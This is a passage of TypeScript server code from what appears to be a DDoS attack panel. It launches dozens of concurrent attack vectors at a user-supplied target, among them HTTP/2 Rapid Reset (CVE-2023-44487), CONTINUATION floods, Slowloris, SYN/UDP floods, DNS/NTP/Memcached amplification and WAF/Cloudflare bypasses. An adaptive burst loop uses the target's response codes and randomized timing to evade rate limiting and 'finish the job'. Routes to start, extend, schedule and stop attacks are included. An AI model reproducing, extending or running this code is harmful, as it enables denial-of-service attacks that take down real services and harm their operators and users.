      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),
      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),
      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),
      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),
      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),
      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
      // L7 Advanced H2 (6 vectors — +h2-rst-burst, +grpc-flood)
      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
      spawnPool("h2-rst-burst",        target, port, rstT,    rstW,    signal, onStats),               // [NEW 35] CVE-2023-44487 pure RST engine
      spawnPool("grpc-flood",          target, port, grpcT,   grpcW,   signal, onStats),               // [NEW 36] gRPC handler pool exhaustion
      // TLS / Crypto (3 vectors)
      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
      spawnPool("quic-flood",          target, port, quicT,   quicW,   signal, onStats),
      // Extended App — Tier 2 (5 vectors)
      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),
      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),
      // L7 H2 Priority (1 vector)
      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),
      // L4 Transport (1 vector)
      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
      // L3 Network (5 vectors)
      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),
      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),
      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),
      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),
      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),
      // UDP / Volumetric (2 vectors)
      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
    ]); // Total: 35 ARES OMNIVECT ∞ v2 vectors (+h2-rst-burst, +grpc-flood)

    // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
    // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
    // Uniform burst timing is detectable by ML rate limiters — irregular cadence defeats them.
    //
    // T004 ADAPTIVE LOGIC: reads live response codes from the T003 telemetry map to
    // dynamically select which vectors to boost in each wave:
    //   • 5xx dominant (>35% of total) → server is overwhelmed → boost H2/RST vectors
    //   • 429 dominant (>25% of client) → rate-limited → boost gRPC + proxy-rotation vectors
    //   • Mixed/unknown → standard wave rotation (H2 → App → Max)
    const ri = (min: number, max: number) => Math.floor(Math.random() * (max - min)) + min;
    const burstLoop = async () => {
      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for initial probing
      let wave = 0;
      while (!signal.aborted) {
        wave++;
        const onMs   = ri(8_000,  22_000); // ★ random 8-22s burst window (defeats fixed-pattern detection)
        const restMs = ri(3_000,  10_000); // ★ random 3-10s rest between bursts
        const burstAbort = new AbortController();
        const burstTimer = setTimeout(() => burstAbort.abort(), onMs);
        const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
          ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
          : burstAbort.signal;

        // T004: Read real-time response code distribution to select wave strategy
        const codes  = liveResponseCodes.get(id ?? -1) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
        const total  = codes.ok + codes.redir + codes.client + codes.server + codes.timeout;
        const svRat  = total > 0 ? codes.server / total : 0;  // 5xx ratio
        const ratRat = total > 0 ? codes.client / (total || 1) : 0; // 4xx ratio (includes 429)

        if (svRat > 0.35) {
          // ★ SERVER OVERWHELMED (5xx > 35%) — double-down on H2 + RST to finish the job
          void Promise.all([
            spawnPool("http2-flood",      target, port, Math.round(h2T    * 3.0), Math.min(h2W, 10),    combined, onStats),
            spawnPool("h2-rst-burst",     target, port, Math.round(rstT   * 3.0), Math.min(rstW, 10),   combined, onStats),
            spawnPool("h2-settings-storm",target, port, Math.round(stormT * 2.8), Math.min(stormW, 8),  combined, onStats),
            spawnPool("http-pipeline",    target, port, Math.round(pipeT  * 2.8), Math.min(pipeW, 8),   combined, onStats),
            spawnPool("h2-ping-storm",    target, port, Math.round(pingT  * 2.5), Math.min(pingW, 6),   combined, onStats),
            spawnPool("hpack-bomb",       target, port, Math.round(hpackT * 2.5), Math.min(hpackW, 6),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (ratRat > 0.25) {
          // ★ RATE LIMITED (4xx > 25%) — switch to gRPC + WAF bypass (different rate limit pools)
          void Promise.all([
            spawnPool("grpc-flood",       target, port, Math.round(grpcT  * 3.0), Math.min(grpcW, 8),   combined, onStats),
            spawnPool("waf-bypass",       target, port, Math.round(wafT   * 2.5), Math.min(wafW, 6),    combined, onStats),
            spawnPool("http-bypass",      target, port, Math.round(bypassT* 2.5), Math.min(bypassW, 6), combined, onStats),
            spawnPool("cache-poison",     target, port, Math.round(cacheT * 2.0), Math.min(cacheW, 4),  combined, onStats),
            spawnPool("graphql-dos",      target, port, Math.round(gqlT   * 2.0), Math.min(gqlW, 4),    combined, onStats),
            spawnPool("app-smart-flood",  target, port, Math.round(appT   * 2.0), Math.min(appW, 6),    combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 3 === 0) {
          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave)
          void Promise.all([
            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.5), Math.min(h2W, 8),    combined, onStats),
            spawnPool("h2-rst-burst",       target, port, Math.round(rstT   * 2.5), Math.min(rstW, 8),   combined, onStats),
            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.5), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.5), Math.min(stormW, 8), combined, onStats),
            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.5), Math.min(appW, 8),   combined, onStats),
            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.5), Math.min(lhbW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.5), Math.min(pingW, 4),  combined, onStats),
            spawnPool("waf-bypass",         target, port, Math.round(wafT   * 2.0), Math.min(wafW, 4),   combined, onStats),
            spawnPool("hpack-bomb",         target, port, Math.round(hpackT * 2.0), Math.min(hpackW, 4), combined, onStats),
            spawnPool("grpc-flood",         target, port, Math.round(grpcT  * 2.0), Math.min(grpcW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 2 === 0) {
          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2×)
          void Promise.all([
            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 2.2), Math.min(appW, 8),  combined, onStats),
            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 2.2), Math.min(lhbW, 8), combined, onStats),
            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 2.2), Math.min(prioW, 6), combined, onStats),
            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 2.2), Math.min(kaW, 4),   combined, onStats),
            spawnPool("http-smuggling",       target, port, Math.round(smugT * 2.2), Math.min(smugW, 4), combined, onStats),
            spawnPool("tls-renego",           target, port, Math.round(tlsT  * 2.0), Math.min(tlsW, 4),  combined, onStats),
            spawnPool("ssl-death",            target, port, Math.round(sslT  * 2.0), Math.min(sslW, 4),  combined, onStats),
            spawnPool("grpc-flood",           target, port, Math.round(grpcT * 2.0), Math.min(grpcW, 4), combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else {
          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0×)
          void Promise.all([
            spawnPool("http2-flood",       target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
            spawnPool("h2-rst-burst",      target, port, Math.round(rstT   * 2.0), Math.min(rstW, 8),   combined, onStats),
            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
            spawnPool("http2-continuation",target, port, Math.round(contT  * 2.0), Math.min(contW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
            spawnPool("http2-priority-storm",target,port, Math.round(prioT * 1.8), Math.min(prioW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        }
        // ★ Random rest duration — defeats steady-state traffic analysis
        await new Promise<void>(r => setTimeout(r, restMs));
      }
    };
    // Burst mode: deployed only — in dev, extra workers would cause OOM
    if (IS_DEPLOYED) void burstLoop();
    await geassPromise;
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  BYPASS STORM — focused 7-vector WAF/Cloudflare composite
  //  Less RAM than geass-override, tuned specifically for CF/Akamai bypasses
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "bypass-storm") {
    const wafW  = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);
    const h2W   = Math.max(4, CPU_COUNT);
    const contW = Math.max(3, Math.floor(CPU_COUNT * 0.75));
    const hpackW= Math.max(3, Math.floor(CPU_COUNT / 2));
    const smugW = 2;
    const bypassW = Math.max(3, Math.floor(CPU_COUNT / 2));
    const cacheW = 2;

    const wafT    = Math.max(600, Math.round(threads * 0.45));
    const h2T     = Math.max(800, Math.round(threads * 0.65));
    const contT   = Math.max(500, Math.round(threads * 0.40));
    const hpackT  = Math.max(400, Math.round(threads * 0.35));
    const smugT   = Math.max(80,  Math.round(threads * 0.05));
    const bypassT = Math.max(300, Math.round(threads * 0.25));
    const cacheT  = Math.max(80,  Math.round(threads * 0.05));

    await Promise.all([
      spawnPool("waf-bypass",         target, port, wafT,    wafW,    signal, onStats),
      spawnPool("h2-rst-burst",       target, port, h2T,     h2W,    signal, onStats),
      spawnPool("http2-continuation", target, port, contT,   contW,  signal, onStats),
      spawnPool("hpack-bomb",         target, port, hpackT,  hpackW, signal, onStats),
      spawnPool("http-smuggling",     target, port, smugT,   smugW,  signal, onStats),
      spawnPool("http-bypass",        target, port, bypassT, bypassW,signal, onStats),
      spawnPool("cache-poison",       target, port, cacheT,  cacheW, signal, onStats),
    ]);
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers (1 in dev)
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Static method catalogue ───────────────────────────────────────────────
const METHODS_CATALOGUE = [
  // Geass / Special
  { id: "geass-override",       name: "Geass Override ∞ [ARES 35v]",          layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "MAX POWER — 35 simultaneous attack vectors: H2+TCP+UDP+TLS+Slowloris+WAF+WebSocket+GraphQL+RUDY+Cache+Pipeline+Smuggling+QUIC+ICMP+DNS+NTP+Memcached+SSDP+DoH+gRPC" },
  { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST → Phase 3: AppFlood+CacheBust. All 3 phases run concurrently with independent thread pools" },
  // L7 Application
  { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
  { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
  { id: "http2-continuation",   name: "H2 CONTINUATION (CVE-2024-27316)",     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4" },
  { id: "hpack-bomb",           name: "HPACK Bomb (RFC 7541)",                layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "Incremental-indexed headers → HPACK table eviction storm" },
  { id: "h2-settings-storm",    name: "H2 Settings Storm",                    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain" },
  { id: "http-pipeline",        name: "HTTP Pipeline Flood",                  layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "HTTP/1.1 keep-alive pipelining — 512 reqs per TCP write, no wait, 300K+ req/s" },
  { id: "ws-flood",             name: "WebSocket Exhaustion",                 layer: "L7",   protocol: "WebSocket",            tier: "A",      description: "Holds thousands of WS conns open — goroutine/thread per conn" },
  { id: "cache-poison",         name: "CDN Cache Poisoning DoS",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Fills CDN cache with unique keys — 100% origin miss rate eviction" },
  { id: "slowloris",            name: "Slowloris",                            layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "25K half-open connections — starves nginx/apache thread pool" },
  { id: "conn-flood",           name: "TLS Connection Flood",                 layer: "L7",   protocol: "TLS",                  tier: "A",      description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion" },
  { id: "tls-renego",           name: "TLS Renegotiation DoS",                layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn" },
  { id: "rudy-v2",              name: "RUDY v2 — Multipart SlowPOST",         layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect" },
  { id: "http-flood",           name: "HTTP Flood",                           layer: "L7",   protocol: "HTTP",                 tier: "B",      description: "High-volume HTTP GET — overwhelms web server resources directly" },
  { id: "http-bypass",          name: "HTTP Bypass",                          layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN" },
  // L4 Transport
  { id: "quic-flood",           name: "QUIC/HTTP3 Flood (RFC 9000)",          layer: "L4",   protocol: "QUIC/UDP",             tier: "A",      description: "QUIC Initial packets — server allocates crypto state per DCID → OOM" },
  { id: "ssl-death",            name: "SSL Death Record",                     layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU" },
  { id: "udp-flood",            name: "UDP Flood",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "Raw UDP packet flood — saturates L4 bandwidth" },
  { id: "syn-flood",            name: "SYN Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake" },
  { id: "tcp-flood",            name: "TCP Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Raw TCP packet flood against open ports" },
  // L3 Network
  { id: "icmp-flood",           name: "ICMP Flood [3-tier engine]",           layer: "L3",   protocol: "ICMP",                 tier: "B",      description: "Real ICMP: raw-socket (CAP_NET_RAW), hping3, UDP saturation burst" },
  { id: "ntp-amp",              name: "NTP Flood [mode7+mode3]",              layer: "L3",   protocol: "NTP/UDP",              tier: "B",      description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123" },
  { id: "dns-amp",              name: "DNS Water Torture [CDN-bypass]",       layer: "L3",   protocol: "DNS",                  tier: "A",      description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely" },
  { id: "mem-amp",              name: "Memcached UDP Flood [binary]",         layer: "L3",   protocol: "Memcached/UDP",        tier: "B",      description: "Real Memcached binary protocol UDP — get+stats to port 11211" },
  { id: "ssdp-amp",             name: "SSDP M-SEARCH Flood [UPnP]",          layer: "L3",   protocol: "SSDP/UDP",             tier: "B",      description: "Real SSDP protocol to port 1900 — rotates ST targets, UPnP stack exhaustion" },
  // ARES OMNIVECT ∞
  { id: "slow-read",            name: "Slow Read — TCP Buffer Exhaust",       layer: "L7",   protocol: "TCP",                  tier: "A",      description: "Pauses TCP recv window — server send buffer fills, all threads block on write" },
  { id: "range-flood",          name: "Range Flood — 500× I/O",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted" },
  { id: "xml-bomb",             name: "XML Bomb — Billion Laughs XXE",        layer: "L7",   protocol: "HTTP/XML",             tier: "A",      description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint" },
  { id: "h2-ping-storm",        name: "H2 PING Storm — RFC 7540 §6.7",        layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "300 PING frames/burst × 2ms per conn — server must ACK every one; CPU exhaustion" },
  { id: "http-smuggling",       name: "HTTP Request Smuggling — TE/CL Desync",layer: "L7",   protocol: "HTTP/1.1",             tier: "S",      description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently" },
  { id: "doh-flood",            name: "DoH Flood — DNS-over-HTTPS Exhaust",   layer: "L7",   protocol: "HTTPS/DNS",            tier: "A",      description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool" },
  { id: "keepalive-exhaust",    name: "Keepalive Exhaust — 256-Req Pipeline", layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "256-request pipeline per conn held 10-20s — MaxKeepAliveRequests saturation" },
  { id: "app-smart-flood",      name: "App Smart Flood — DB Query Exhaust",   layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "POST to /login /search /checkout — forces DB queries, uncacheable" },
  { id: "large-header-bomb",    name: "Large Header Bomb — 32KB Headers",     layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "32KB randomized headers exhaust HTTP parser allocator, fills nginx header buffer" },
  { id: "http2-priority-storm", name: "H2 Priority Storm — RFC 7540 §6.3",    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "PRIORITY frames force server to rebuild stream dependency tree — 150K frames/sec" },
  { id: "h2-rst-burst",         name: "H2 RST Burst — CVE-2023-44487",        layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "HEADERS+RST_STREAM pairs — pure write-path overload, zero read-side pressure" },
  { id: "grpc-flood",           name: "gRPC Flood — Handler Pool Exhaust",    layer: "L7",   protocol: "gRPC/HTTP2",           tier: "A",      description: "application/grpc content-type — exhausts gRPC handler thread pool" },
  // ── New vectors ───────────────────────────────────────────────────────────
  { id: "tls-session-exhaust",  name: "TLS Session Cache Exhaustion",          layer: "L4",   protocol: "TLS",                  tier: "A",      description: "Full TLS handshake per conn — no resumption — saturates server's RSA/ECDHE crypto thread pool. 5× more CPU-intensive than conn-flood" },
  { id: "cache-buster",         name: "Cache Busting — 100% Origin Hit Rate",  layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Unique cache keys + Cache-Control:no-cache + Vary bombs — forces CDN to miss 100% of requests, overwhelming the origin directly" },
  // Previously missing from catalogue
  { id: "udp-bypass",           name: "UDP Bypass",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "UDP flood with bypass techniques to evade basic rate limiting and DDoS mitigation" },
  { id: "tcp-ack",              name: "TCP ACK Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends ACK packets without established connections, forcing the target to process each one" },
  { id: "tcp-rst",              name: "TCP RST Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends RST packets to disrupt existing TCP connections on the target" },
  { id: "graphql-dos",          name: "GraphQL Introspection DoS",             layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Deep introspection fragment bombs — exponential type resolution; exhausts GraphQL executor thread pool" },
  { id: "rudy",                 name: "R.U.D.Y — True SlowPOST",              layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Content-Length:1GB then 1-2 bytes every 5-15s — Apache/IIS hold thread forever; 25K conns = full pool exhaustion" },
  { id: "vercel-flood",         name: "Vercel Flood ∞ (Next.js 4-Vector)",     layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "RSC Bypass + Image Optimizer DoS + Edge API Cold Start + ISR Route Flood — saturates Vercel lambda concurrency limit" },
  { id: "cldap-amp",            name: "CLDAP Flood [UDP/389 LDAP]",            layer: "L3",   protocol: "UDP",                  tier: "B",      description: "BER-encoded LDAP SearchRequest to UDP/389 — exhausts Windows AD/OpenLDAP worker thread pool; alternates rootDSE + supportedCapabilities" },
];

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const endTime = Date.now() + duration * 1000;
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);
  attackEndTimes.set(id, endTime);

  // Init in-memory counters
  livePackets.set(id, 0);
  liveBytes.set(id, 0);
  livePps.set(id, 0);
  liveBps.set(id, 0);
  prevPktsSnap.set(id, 0);
  prevBytesSnap.set(id, 0);
  liveResponseCodes.set(id, { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 });
  liveLatAvgMs.set(id, 0);

  // T003: Register code dispatcher in global registry (keyed by AbortSignal)
  _codeDispatchers.set(ctrl.signal, (codes, latAvgMs) => onWorkerCodes(id, codes, latAvgMs));
  ctrl.signal.addEventListener("abort", () => _codeDispatchers.delete(ctrl.signal), { once: true });

  // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
  if (method === "geass-override" && !req.query.peer) {
    fanOutToCluster(target, port, method, duration, threads);
  }

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns),
    id, // T004: pass attack id so Geass Override burst loop can read response codes
  ).finally(async () => {
    // Final flush of any pending batch stats
    const pending = dbBatchPkts.get(id) ?? 0;
    const pendingBytes = dbBatchBytes.get(id) ?? 0;
    dbBatchPkts.delete(id);
    dbBatchBytes.delete(id);
    if (pending > 0 || pendingBytes > 0) {
      addStats(id, pending, pendingBytes).catch(err =>
        console.warn(`[FINALLY] addStats flush failed for #${id}:`, err instanceof Error ? err.message : err)
      );
    }

    attackLiveConns.delete(id);
    livePackets.delete(id);
    liveBytes.delete(id);
    livePps.delete(id);
    liveBps.delete(id);
    prevPktsSnap.delete(id);
    prevBytesSnap.delete(id);
    // T003: keep codes for 60s so panel can show final breakdown, then cleanup
    setTimeout(() => { liveResponseCodes.delete(id); liveLatAvgMs.delete(id); }, 60_000);
    // Keep timeseries for 60s after attack ends so panel can render final chart
    setTimeout(() => liveTimeseries.delete(id), 60_000);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    attackEndTimes.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch (err) {
      console.warn(`[ATTACK #${id}] DB finalize failed:`, err instanceof Error ? err.message : err);
    }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
export const attackAborts  = new Map<number, AbortController>();

// ── Exported getter for SSE events route ─────────────────────────────────
export function getActiveAttackCount(): number { return attackAborts.size; }
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

// ── Scheduled attacks (GET must be BEFORE /attacks/:id to avoid conflict) ──
router.get("/attacks/scheduled", (_req, res): void => {
  res.json([...scheduledAttacks.values()]);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  // Run all 3 queries in parallel — no full table scan in JS
  const [aggRows, methodRows, recentAttacks] = await Promise.all([
    // 1. Aggregate totals — O(1) via SQL COUNT/SUM
    db.select({
      totalAttacks:     sql<number>`COUNT(*)::int`,
      runningAttacks:   sql<number>`COUNT(*) FILTER (WHERE status = 'running')::int`,
      totalPacketsSent: sql<number>`COALESCE(SUM(packets_sent), 0)::bigint`,
      totalBytesSent:   sql<number>`COALESCE(SUM(bytes_sent), 0)::bigint`,
    }).from(attacksTable),
    // 2. Per-method counts — O(distinct methods) index scan
    db.select({
      method: attacksTable.method,
      count:  sql<number>`COUNT(*)::int`,
    }).from(attacksTable).groupBy(attacksTable.method),
    // 3. Recent 10 only — O(10) with LIMIT
    db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt)).limit(10),
  ]);
  const agg = aggRows[0];
  res.json({
    totalAttacks:     agg.totalAttacks,
    runningAttacks:   agg.runningAttacks,
    totalPacketsSent: Number(agg.totalPacketsSent),
    totalBytesSent:   Number(agg.totalBytesSent),
    attacksByMethod:  methodRows,
    recentAttacks,
    cpuCount:         CPU_COUNT,
  });
});

// Live timeseries — last 60 samples (1 per second) for chart rendering
router.get("/attacks/:id/timeseries", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const series = liveTimeseries.get(id) ?? [];
  res.json({ samples: series, max: TIMESERIES_MAX });
});

// Live in-memory stats — real-time, no DB latency
// Returns conns, pps, bps, totalPackets, totalBytes, running
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const running = attackAborts.has(id);
  const codes = liveResponseCodes.get(id) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
  res.json({
    conns:        attackLiveConns.get(id) ?? 0,
    running,
    pps:          livePps.get(id)     ?? 0,
    bps:          liveBps.get(id)     ?? 0,
    totalPackets: livePackets.get(id) ?? 0,
    totalBytes:   liveBytes.get(id)   ?? 0,
    // T003 — response code breakdown + average latency
    codes,
    latAvgMs:     liveLatAvgMs.get(id) ?? 0,
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one using correct remaining time
  // Bug-fix: previously reset timer to addSec from NOW, losing remaining original time.
  // Now we compute: newEndTime = max(now, currentEndTime) + addSec
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const currentEnd = attackEndTimes.get(id) ?? Date.now();
  const newEnd     = Math.max(Date.now(), currentEnd) + addSec * 1000;
  const msFromNow  = newEnd - Date.now();
  attackEndTimes.set(id, newEnd);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), msFromNow);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
